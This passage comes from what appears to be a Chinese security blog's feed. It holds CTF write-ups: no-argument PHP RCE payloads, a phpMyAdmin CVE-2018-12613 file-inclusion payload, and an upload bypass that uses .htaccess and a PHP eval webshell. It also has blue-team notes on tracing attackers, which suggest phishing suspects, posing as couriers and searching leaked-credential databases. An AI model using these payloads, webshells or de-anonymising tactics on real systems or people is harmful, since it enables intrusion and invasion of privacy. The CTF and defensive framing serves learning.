class="line">2.过滤了常用的几个伪协议，不能以伪协议读取文件。</span><br><span class="line">3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</span><br><span class="line">4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。</span><br><span class="line">5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE</span><br></pre></td></tr></table></div></figure>        <h2 id="3-无参数函数">          <a href="#3-无参数函数" class="heading-link"><i class="fas fa-link"></i></a>3. 无参数函数</h2>              <h3 id="3-1-print-r">          <a href="#3-1-print-r" class="heading-link"><i class="fas fa-link"></i></a>3.1 print_r()</h3>      <p>读取文件函数，相似的函数还有：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_content()</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></div></figure>        <h3 id="3-2-localeconv">          <a href="#3-2-localeconv" class="heading-link"><i class="fas fa-link"></i></a>3.2 localeconv()</h3>      <p>返回一个包含本地数字及货币格式信息的数组。</p>        <h3 id="3-4-current-pos">          <a href="#3-4-current-pos" class="heading-link"><i class="fas fa-link"></i></a>3.4 current()/pos()</h3>      <p>返回数组中的当前单元，默认取第一个值。</p>        <h3 id="3-4-scandir">          <a href="#3-4-scandir" class="heading-link"><i class="fas fa-link"></i></a>3.4 scandir()</h3>      <p>列出目录中的文件和目录 。</p>        <h3 id="3-5-next">          <a href="#3-5-next" class="heading-link"><i class="fas fa-link"></i></a>3.5 next()</h3>      <p>该函数将内部指针指向数组中的下一个元素并输出。</p>        <h3 id="3-6-end">          <a href="#3-6-end" class="heading-link"><i class="fas fa-link"></i></a>3.6 end()</h3>      <p>取数组的最后一项，数组指针指向下一位。</p>        <h3 id="3-7-array-reverse">          <a href="#3-7-array-reverse" class="heading-link"><i class="fas fa-link"></i></a>3.7 array_reverse()</h3>      <p>以相反的元素返回数组，将数组颠倒。</p>        <h3 id="3-8-array-rand">          <a href="#3-8-array-rand" class="heading-link"><i class="fas fa-link"></i></a>3.8 array_rand()</h3>      <p>随机返回数组的键名。</p>        <h3 id="3-9-array-flip">          <a href="#3-9-array-flip" class="heading-link"><i class="fas fa-link"></i></a>3.9 array_flip()</h3>      <p>交换数组的键和值。</p>        <h3 id="3-10-highlight-file">          <a href="#3-10-highlight-file" class="heading-link"><i class="fas fa-link"></i></a>3.10 highlight_file()</h3>      <p>打印输出或者返回filename文件中语法高亮版本的代码。</p>        <h2 id="4-构建payload">          <a href="#4-构建payload" class="heading-link"><i class="fas fa-link"></i></a>4. 构建payload</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(pos(localeconv())));   &#x2F;&#x2F;查看当前目录文件下的存在的数组</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/2.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">或者&#x2F;或者其他</span><br><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/3.png"></p>        <h2 id="5-方法二">          <a href="#5-方法二" class="heading-link"><i class="fas fa-link"></i></a>5. 方法二</h2>              <h3 id="5-1-session-id-session-start">          <a href="#5-1-session-id-session-start" class="heading-link"><i class="fas fa-link"></i></a>5.1 session_id(session_start())</h3>      <p>这道题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认的是不主动使用session的，session_id()可以获取当前的session_id。</p><p>所以我们手动设置名为PHPSESSID的cookie，并设置为flag.php。</p><p><img src="/2021/03/20/GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/4.png"></p><p>参考：<span class="exturl"><a class="exturl__link" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 文件泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF-2019-我有一个数据库</title>
      <link href="2021/03/20/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>2021/03/20/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/20/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png"></p><a id="more"></a>        <h2 id="2-dirsearch扫描网站目录">          <a href="#2-dirsearch扫描网站目录" class="heading-link"><i class="fas fa-link"></i></a>2. dirsearch扫描网站目录</h2>      <p>没有什么头绪，dirsearch扫描目录：</p><figure class="highlight dos"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -<span class="number">3</span> dirsearch.py -u http://a02cf551-<span class="number">71</span>bf-<span class="number">4622</span>-<span class="number">9</span>ea7-<span class="number">9471</span>d9cccaba.node3.buuoj.cn -e *</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png"></p><p>泄露了phpinfo.php文件和phpmyadmin，查看phpinfo.php没有发现什么，这题也是有关数据库的，直接免密进入phpmyadmin中</p><p><img src="/2021/03/20/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png"></p><p>版本号：4.8.1</p>        <h2 id="3-CVE-2018-12613漏洞利用">          <a href="#3-CVE-2018-12613漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>3. CVE-2018-12613漏洞利用</h2>      <p>此题涉及<span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/6592">CVE-2018-12613 phpMyAdmin远程文件包含漏洞</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">％25的url编码为％</span><br><span class="line">％3f的url编码为？</span><br><span class="line">％253f-&gt;？</span><br></pre></td></tr></table></div></figure><p>如传入<code>?target=db_datadict.php%253f</code>，<code>%253f</code>开始服务器自动解码一次为<code>%3f</code>，然后<code>urldecode</code>函数再解码一次为<code>?</code>，则满足截取?之前的内容在白名单中，返回<code>true</code>。而在<code>index.php</code>中只解码一次为<code>db_datadict.php%3f</code>，然后进行包含</p><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br><span class="line">或者：</span><br><span class="line">&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> CVE </tag>
            
            <tag> 文件泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-BabyUpload</title>
      <link href="2021/03/20/GXYCTF2019-BabyUpload/"/>
      <url>2021/03/20/GXYCTF2019-BabyUpload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-上传-htaccess文件">          <a href="#1-上传-htaccess文件" class="heading-link"><i class="fas fa-link"></i></a>1. 上传 .htaccess文件</h2>      <p>文件内容：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></div></figure><a id="more"></a><p><img src="/2021/03/20/GXYCTF2019-BabyUpload/1.png"></p><p>修改上传的Content-type为imge/jpeg格式</p><p><img src="/2021/03/20/GXYCTF2019-BabyUpload/2.png"></p><p>上传成功，该目录下的其他类型文件均以php格式解析</p>        <h2 id="2-上传木马文件">          <a href="#2-上传木马文件" class="heading-link"><i class="fas fa-link"></i></a>2. 上传木马文件</h2>      <p>经过测试，该页面对含有<code>&lt;?php</code>进行过滤</p><p>所以jpeg文件中使用其他语句：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;</span><br><span class="line">或者：</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;assert($_REQUEST[&#39;shell&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/GXYCTF2019-BabyUpload/3.png"></p><p>文件上传成功</p><p><img src="/2021/03/20/GXYCTF2019-BabyUpload/4.png"></p>        <h2 id="3-蚁剑连接">          <a href="#3-蚁剑连接" class="heading-link"><i class="fas fa-link"></i></a>3. 蚁剑连接</h2>      <p>连接地址：<span class="exturl"><a class="exturl__link" href="http://8cf9fb2c-2b87-4f94-b9e1-1722ad515408.node3.buuoj.cn/upload/5e5980c740b6a0c59d18ed06583da861/shell1.jpeg">http://8cf9fb2c-2b87-4f94-b9e1-1722ad515408.node3.buuoj.cn/upload/5e5980c740b6a0c59d18ed06583da861/shell1.jpeg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>密码：shell</p><p><img src="/2021/03/20/GXYCTF2019-BabyUpload/5.png"></p><p><img src="/2021/03/20/GXYCTF2019-BabyUpload/6.png"></p><p>get flag！！！</p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HW之蓝队溯源</title>
      <link href="2021/03/13/HW%E4%B9%8B%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90/"/>
      <url>2021/03/13/HW%E4%B9%8B%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-前言">          <a href="#1-前言" class="heading-link"><i class="fas fa-link"></i></a>1. 前言</h2>      <p>HW中蓝队得分，需要完整的还原攻击链条，溯源到攻击者的虚拟身份，真实身份，溯源到攻击队员，甚至反控攻击方主机，并根据程度阶梯给分。</p><p>溯源报告需要提交以下要素：</p><a id="more"></a><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">姓名&#x2F;ID：</span><br><span class="line">攻击IP：</span><br><span class="line">地理位置：</span><br><span class="line">QQ：</span><br><span class="line">IP地址所属公司：</span><br><span class="line">IP地址关联域名</span><br><span class="line">邮箱：</span><br><span class="line">手机号：</span><br><span class="line">微信&#x2F;微博&#x2F;src&#x2F;id证明：</span><br><span class="line">人物照片：</span><br><span class="line">跳板机（可选）：</span><br><span class="line">关联攻击事件：</span><br></pre></td></tr></table></div></figure><ol><li>通过梳理，攻击溯源的技术手段，主要包括IP定位，ID定位与攻击者定位。</li><li>通过IP可定位攻击者所在位置，以及通过IP反查域名等手段，查询域名的注册信息，域名注册人及邮箱等信息。</li><li>通过ID定位可获得攻击者常用的网络ID，查询攻击者使用同类ID注册过的微博或者博客，论坛等网站，通过对网络ID注册以及使用情况的查询，定位攻击者所在公司，手机号，邮箱，QQ等信息。</li><li>或通过其他手段定位攻击者，如反制攻击者vps，获取攻击者vps中的敏感信息，反钓鱼，恶意程序分析溯源等手段。</li><li>通过对手机号码定位，一是通过添加某信好友查看头像，昵称，城市等；而是通过添加某宝，可以查看其部分实名信息，头像，城市，动态等；三是可以假装送外卖，送快递的，询问是不是某人，某地址等，进一步核实信息。</li><li>通过对邮箱定位，意识通添加某宝，查看其部分实名信息，头像，城市，动态等（可以未通过邮箱主持）；二是发送钓鱼邮件，控制邮箱或者掌握IP地址。</li><li>过程中若掌握攻击者的照片，可以通过百度，Google等以图搜图的方式关联攻击者其他图片信息。</li></ol>        <h2 id="2-IP定位技术">          <a href="#2-IP定位技术" class="heading-link"><i class="fas fa-link"></i></a>2. IP定位技术</h2>      <p>通过安全设备或者其他技术手段抓取攻击者的IP，对IP进行定位，查询此IP为IDC的IP，CDN的IP还是普通运营商的出口IP，通过IP反查可能会查询到攻击者使用的web域名，注册人，邮箱等信息。一般常用的IP查询工具及开源情报，开发端口分析工具如下：</p>        <h3 id="2-1-IP-定位工具">          <a href="#2-1-IP-定位工具" class="heading-link"><i class="fas fa-link"></i></a>2.1 IP 定位工具</h3>      <ol><li>高精度IP定位：<span class="exturl"><a class="exturl__link" href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>rtbasia（IP 查询）：<span class="exturl"><a class="exturl__link" href="https://ip.rtbasia.com/">https://ip.rtbasia.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>ipplus360（IP查询）：<span class="exturl"><a class="exturl__link" href="http://www.ipplus360.com/ip/">http://www.ipplus360.com/ip/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>IP信息查询：<span class="exturl"><a class="exturl__link" href="https://www.ipip.net/ip.html/">https://www.ipip.net/ip.html/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>IP地址查询在线工具：<span class="exturl"><a class="exturl__link" href="https://tool.lu/ip/">https://tool.lu/ip/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="2-2-威胁情报工具">          <a href="#2-2-威胁情报工具" class="heading-link"><i class="fas fa-link"></i></a>2.2 威胁情报工具</h3>      <ol><li>微步在线：<span class="exturl"><a class="exturl__link" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>奇安信：<span class="exturl"><a class="exturl__link" href="https://ti.qianxin.com/">https://ti.qianxin.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>360：<span class="exturl"><a class="exturl__link" href="https://ti.360.cn/">https://ti.360.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link" href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link" href="https://community.riskiq.com/">https://community.riskiq.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link" href="https://www.shodan.io/">https://www.shodan.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol><p>当发现某些IP的攻击后，可以尝试通过此IP去溯源攻击者，具体实现过程如下：</p><ul><li>首先通过ipip.net 网站或者其他接口，查询此IP为 IDC 的 IP ，CDN 的IP 还是 普通运营商的出口 IP。</li><li>如果 IP反查到域名就可以去<strong>站长之家</strong>或者 <strong>whois.domaintools.com</strong> 等网站去查询域名的注册信息。</li></ul><p>通过收集到的这些信息，就比较容易定位到人。</p><p>在通过IP定位技术溯源过程中，应注意以下情况：</p><ul><li>假如 IP 反查的域名过多，考虑的就是 CDN，就没有必要继续去查了。</li><li>如果是普通运营商的出口IP就只能使用一些高精度IP定位工具粗略估计攻击者的地址，如果需要具体定位到人，则需要更多的信息。</li></ul>        <h2 id="3-ID追踪技术">          <a href="#3-ID追踪技术" class="heading-link"><i class="fas fa-link"></i></a>3. ID追踪技术</h2>      <p>在通过IP定位后技术追踪攻击者，可通过指纹库，社工库等或其他技术手段抓取到攻击者的微博账号，百度ID等信息，一般通过以下技术手段实现：</p><ol><li>进行QQ同名方式去搜索，进行论坛等同名方式搜索，社工库匹配。</li><li>如果 ID 是邮箱，则通过社工库匹配密码，以往注册信息等。</li><li>如果 ID 是手机号，则通过手机号搜索相关注册信息，以及手机号使用者姓名。</li></ol><p>例如，当通过 ID 追踪技术手段定位到某攻击者的QQ 号，QQ 网名等信息，通过专业社工库可以进一步追踪攻击者使用的 QQ 号注册过的其他网络 ID ，从而获得更多攻击者信息，从而确丁攻击者的身份。</p>        <h2 id="4-攻击程序分析">          <a href="#4-攻击程序分析" class="heading-link"><i class="fas fa-link"></i></a>4. 攻击程序分析</h2>      <p>攻击者如果在攻击过程中对攻击目标上传攻击程序（如钓鱼软件），可通过对攻击者上传的而已程序进行分析，并结合 IP 定位，ID 追踪等技术手段对攻击进行分析溯源，常用的而已程序分析网站有：</p><ol><li>微步在线云沙箱：<span class="exturl"><a class="exturl__link" href="https://s.threatbook.cn/">https://s.threatbook.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>Virustotal：<span class="exturl"><a class="exturl__link" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>火眼：<span class="exturl"><a class="exturl__link" href="https://fireeye.ijinshan.com/">https://fireeye.ijinshan.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>Anubis：<span class="exturl"><a class="exturl__link" href="http://anubis.iseclab.org/">http://anubis.iseclab.org</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>joe：<span class="exturl"><a class="exturl__link" href="http://www.joesecurity.org/">http://www.joesecurity.org</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h2 id="5-蜜罐">          <a href="#5-蜜罐" class="heading-link"><i class="fas fa-link"></i></a>5. 蜜罐</h2>      <p>蜜罐技术为网络安全中的一种入侵诱饵，目的是引诱黑客前来攻击，并收集黑客相关的证据和信息。</p><p>蜜罐溯源实战参考：<span class="exturl"><a class="exturl__link" href="https://www.freebuf.com/articles/web/246060.html">https://www.freebuf.com/articles/web/246060.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="5-1-介绍">          <a href="#5-1-介绍" class="heading-link"><i class="fas fa-link"></i></a>5.1 介绍</h3>      <p><strong>从被动防御到主动防御</strong></p><p>一直以来，被动防御是通过面向已知特征的威胁，基于特征库精确匹配来发现可疑行为，将目标程序与特征库进行逐一比对，实现对异常行为进行监控和阻断，这些特征库是建立在已经发生的基础之上，这就很好的解释了为什么被动防御是一种“事后”行为。典型的行为有防火墙，入侵检测等。但是对于未知的攻击如 0day ，依赖于特征库匹配的防御是有效应对的，为了应对这种攻防不对等的格局，主动防御出现了，典型的技术有网络空间拟态防御。</p><p><strong>引入主动防御策略</strong></p><p>随着攻击技术的进一步提高，越来越多的方法可以绕过传统的被动防御技术对目标系统发起攻击，传统的被动防御技术也引进了主动防御策略，如各大厂推出的智能防火墙，思科的下一代防火墙，山石网科的智能防火墙，将人工智能技术引入防火墙来主动发现恶意行为。除此之外，也有新型的主动防御技术如沙箱，蜜罐等相继出现，进一步弥补了攻防不对称的局面。这类技术主要解决“已知的未知威胁”，例如，蜜罐通过构建伪装的业务主动引诱攻击者，从而迷惑攻击者，通过捕获IP进行封堵来提高攻击者的时间成本，也可对攻击者进行溯源，但是蜜罐技术还是无法应对 0day漏洞。</p><p><strong>沙箱技术</strong></p><p>沙箱技术源于软件错误隔离技术。SFI主要思想是隔离。沙箱通过采用虚拟化等技术构造一个隔离的运行环境，并且为其中运行的程序提供基本的计算资源抽象，通过对目标程序进行检测分析，准确发现程序中的恶意代码等，进而达到保护宿主机的目的。如默安的架构采用 kvm，长亭采用的是 docker。</p><p>由于沙箱具有隔离性，恶意程序不会影响到沙箱隔离外的系统，而且沙箱还具有检测分析的功能，来分析程序是否为恶意程序。但是还存在隐患，沙箱只能监控常见的操作系统应用接口程序，使一些恶意代码能够轻松绕过从而攻击宿主外的环境。</p><p>基于虚拟机的沙箱为不可信资源提供了虚拟化的运行环境，保证原功能的同时提供了相应的安全防护，对宿主机不会造成影响。基于虚拟机的沙箱采用虚拟化和恶意行为检测两种技术，恶意行为检测技术采用了特征码检测法和行为检测法来进行检测，特征码检测对检测 0day 漏洞无能为了，行为检测可以检测出 0day ，但误报率高。</p><p><img src="/2021/03/13/HW%E4%B9%8B%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90/1.jpg"></p><p><strong>蜜罐技术</strong></p><p>蜜罐技术起源20世纪90年代，它通过部署一套模拟真实的网络系统来引诱攻击者攻击，进而在预设的环境中对入侵行为进行检测，分析，还原攻击者的攻击途径，方法，过程等，并将获取的信息用于保护真实的系统。广泛应用于恶意代码检测与样本捕获，入侵检测与攻击特征提取，网络攻击取证，僵尸网络追踪等。</p><p>蜜罐之所以称为蜜罐，是因为设计之初是为了攻击者量身定做的包含大量漏洞的系统，是用于捕获攻击者的一个陷阱，本质上是一种对攻击者的欺骗技术，只用蜜罐在处于不断被扫描被攻击甚至被攻破的时候，才能体现出蜜罐的价值。蜜罐其实不包括任何敏感数据。可以这么说，能够访问蜜罐的，都是可疑行为，都可以确认为黑客，从而采取下一步动作。</p><p>通过以上的分析，推出蜜罐具有的三种能力：</p><p><strong>伪装：</strong>通过模拟各种含有漏洞的应用系统来引诱攻击者入侵以减少对实际系统的威胁。</p><p><strong>数据诱捕：</strong>攻击者如果攻入蜜罐，那么可以通过蜜罐日志记录来还原攻击者从进入到离开蜜罐期内的所有活动过程及其他信息。</p><p><strong>威胁数据分析：</strong>对攻击者的数据进行分析，还原攻击者的攻击手法，并对此进行溯源等。</p><p>但同时，蜜罐也有它的局限性，只有被攻击时才能发挥它的价值。</p><p>如果攻击者没有触发蜜罐，那么蜜罐是毫无意义的，所以现在我们更要关注如何让攻击者能有效地触碰到蜜罐，然后利用相关技术对此开展溯源。同样，如果攻击者识别了该蜜罐，并且成功进入，利用相关逃逸 0day 对蜜罐展开攻击（蜜罐记录不到），那么蜜罐将被作为跳板机对其他真实业务展开攻击，危害巨大。</p><p><img src="/2021/03/13/HW%E4%B9%8B%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90/2.jpg"></p>        <h3 id="5-2-分类">          <a href="#5-2-分类" class="heading-link"><i class="fas fa-link"></i></a>5.2 分类</h3>      <p><strong>低交互式蜜罐</strong></p><p>通常指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的 服务或端口，用来检测扫描和连接，这种容易被识别。</p><p><strong>中交互式蜜罐</strong></p><p>介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。</p><p><strong>高交互式蜜罐</strong></p><p>指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击方式和类型，但同样也会存在隐患，会对真实网络造成攻击。</p>]]></content>
      
      
      <categories>
          
          <category> HW护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HW干货--蓝队</title>
      <link href="2021/03/13/2021HW%E5%B9%B2%E8%B4%A7-%E8%93%9D%E9%98%9F/"/>
      <url>2021/03/13/2021HW%E5%B9%B2%E8%B4%A7-%E8%93%9D%E9%98%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="0-前言">          <a href="#0-前言" class="heading-link"><i class="fas fa-link"></i></a>0. 前言</h2>      <a id="more"></a><p><img src="/2021/03/13/2021HW%E5%B9%B2%E8%B4%A7-%E8%93%9D%E9%98%9F/0.png"></p>        <h2 id="1-护网前">          <a href="#1-护网前" class="heading-link"><i class="fas fa-link"></i></a>1. 护网前</h2>              <h3 id="1-1-红队角度">          <a href="#1-1-红队角度" class="heading-link"><i class="fas fa-link"></i></a>1.1 红队角度</h3>      <p>对抗！对抗！对抗！</p><p>在打目标的时候，一般用的都是迂回战术！</p><p>因为目标的系统多而杂，有些企业甚至不知道自己有哪些系统，利用这点从底往上摸，但凡有交互的地方都会摸一遍，只要给个口，里外摸个透。</p><p>外紧内松，门户网站或重要系统，多个防护设备，蜜罐。而内网为了办公的便利，防护巨差，甚至内网0防护，一旦从外面打进去，内网横向去打，就会发现一片光明。</p><p>什么运维机，什么密码.xls xxx拓扑，里外翻个遍。</p>        <h3 id="1-2-上帝视角">          <a href="#1-2-上帝视角" class="heading-link"><i class="fas fa-link"></i></a>1.2 上帝视角</h3>      <p>防守方报告基本是防御，处置，溯源。（真实HW中，如果自身溯源能力很差的话，尽早找外援。某行业的HW，红队被反控，这个都能去搞情报）</p>        <h3 id="1-3-前期排查">          <a href="#1-3-前期排查" class="heading-link"><i class="fas fa-link"></i></a>1.3 前期排查</h3>      <p>HW的准备阶段尤为重要，HW前开展一次小的HW，发现问题，解决问题。</p><p>主要分为外网渗透测试和内网渗透测试两部分，外网和内网测试不一样，外网需要结合客户相关业务来，比如政企客户，你需要使用 WordPress，Drupal 的payload去打，不能说百分之百没有，但是成功的概率相当低，要有针对性去测试，因为时间不允许去这么做。</p>        <h4 id="外网渗透测试">          <a href="#外网渗透测试" class="heading-link"><i class="fas fa-link"></i></a>外网渗透测试</h4>      <p>根据实际情况主要关注哪些能直接获取主机权限的漏洞和泄露大量数据的漏洞即可，比如：</p><p>弱口令：数据库，SSH，RDP，后台。</p><p>命令执行：Solr，Jenkins，Weblogic，Struct2，RMI，JBoss，Tomcat，Spring，ActiveMQ，Zabbix</p><p>文件操作：文件上传，文件读取</p><p>未授权访问：Redis，Hadoop，Docker，K8C</p>        <h4 id="内网渗透测试">          <a href="#内网渗透测试" class="heading-link"><i class="fas fa-link"></i></a>内网渗透测试</h4>      <p>内网渗透测试和外网渗透测试区别很大，因为外网不仅有我们，还有其他合作伙伴，各种 WAF ，防火墙，APT，IDS，IPS，以及办公网的 EDR ，杀毒什么的各种安全设备一顿操作。</p>        <h4 id="资产梳理">          <a href="#资产梳理" class="heading-link"><i class="fas fa-link"></i></a>资产梳理</h4>      <p>对废弃边角的资产梳理是重中之重，在HW开展前，企业要对自身的资产进行梳理，减少被攻击面。</p><p>排查服务器补丁情况，业务系统安全性自查。</p><p>排查企业自身信息是否泄露，如：csdn，GitHub，码云，百度文库，百度网盘。。。</p><p><strong>对于云平台：</strong></p><p>因为云平台都是在专有云上，所以写个脚本爬一下资产就可以全部获取到了。</p><p>这里需要注意下爬的字段，因为后期涉及到漏洞修复，安全时间等问题的对接。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| IP 